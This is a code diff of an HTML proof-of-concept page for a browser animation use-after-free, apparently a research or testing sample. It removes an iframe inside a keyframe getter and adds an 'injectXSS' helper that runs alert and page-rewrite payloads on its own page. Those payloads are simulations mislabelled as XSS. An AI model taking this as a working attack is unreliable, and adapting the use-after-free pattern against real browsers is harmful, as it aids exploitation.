@@ -4,6 +4,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PoC Complex Animation Vulnerability</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            text-align: center;
+        }
+        .exploited-element {
+            width: 100px;
+            height: 100px;
+            background-color: blue;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform-origin: center;
+            transition: all 1s ease-in-out;
+        }
+    </style>
 </head>
 <body>
     <h1>PoC for Complex Animation Vulnerability</h1>
@@ -11,7 +29,7 @@
         // Function to dynamically allocate an iframe
         function allociframe() {
             var iframe = document.createElement("iframe");
-            console.log(iframe);
+            console.log("Creating iframe:", iframe);
             iframe.height = 0;
             iframe.width = 0;
             document.body.appendChild(iframe); // Append iframe to the body
@@ -28,13 +46,15 @@
             // Define getter to simulate vulnerability
             arr.__defineGetter__(0, () => {
                 console.log("getter triggered");
+
+                // Simulate iframe removal (use-after-free simulation)
                 document.body.removeChild(iframe); // Simulate cleanup (remove iframe from DOM)
                 
-                // Return a transform property to simulate animation
+                // Return animation properties for 3D translation
                 return { transform: 'translate3D(0, -300px, 0)' };
             });
 
-            // Chain of animations with extended properties
+            // Apply animation on the div element
             c.animate(arr, {
                 duration: 3000,
                 iterations: Infinity,
@@ -49,24 +69,56 @@
         function chainOperations() {
             var elem = triggerAnimation(); // Initial animation trigger
             
-            // Add additional steps in the chain for complexity
+            // Step 1: Manipulate the background color after animation starts
             setTimeout(() => {
-                console.log("Performing next operation after animation...");
-                
-                // Add further manipulation here, for instance changing styles or adding new animations
-                elem.style.backgroundColor = "red";  // Example: Change background color after animation
-                console.log("Changed background color");
-            }, 1500); // Delay to simulate async behavior
+                console.log("Performing first operation: Changing background color...");
+                elem.style.backgroundColor = "red"; // Change background color
+                console.log("Background color changed to red");
 
-            // Final operation in the chain
+                // Inject additional malicious behavior (i.e., another script)
+                injectXSS("console.log('XSS Payload Executed'); alert('XSS!');");
+
+            }, 1500); // Wait for 1.5s to simulate async behavior
+
+            // Step 2: Scale element to simulate a growing animation
             setTimeout(() => {
-                console.log("Finalizing chain...");
-                elem.style.transform = 'translate3D(0, 300px, 0)';  // Change transform property
-            }, 3000);
+                console.log("Performing second operation: Scaling element...");
+                elem.style.transform = 'scale(1.5)'; // Scale the element up
+                console.log("Element scaled up");
+
+                // Chain further payloads here if necessary
+                injectXSS("document.body.innerHTML = '<h1>Malicious content injected!</h1>';");
+
+            }, 2500); // Scale after another 1s
+
+            // Final step: Reset transform and finalize chain
+            setTimeout(() => {
+                console.log("Finalizing chain: Finalizing element...");
+                elem.style.transform = 'translate3D(0, 300px, 0)'; // Change transform property
+                elem.style.backgroundColor = "green"; // Final color change
+                console.log("Element transformed and background color changed to green");
+
+                // Another payload injection at the final step
+                injectXSS("alert('Final XSS Payload!');");
+
+            }, 4000); // Final operation after 4 seconds
+        }
+
+        // Function to inject malicious XSS payload
+        function injectXSS(payload) {
+            console.log("Injecting XSS Payload:", payload);
+            var script = document.createElement("script");
+            script.textContent = payload;
+            document.body.appendChild(script); // Inject XSS payload
         }
 
         // Start the chain of operations
-        chainOperations();
+        try {
+            chainOperations();
+        } catch (error) {
+            console.error("Error occurred in animation chain:", error);
+        }
+
     </script>
 </body>
 </html>
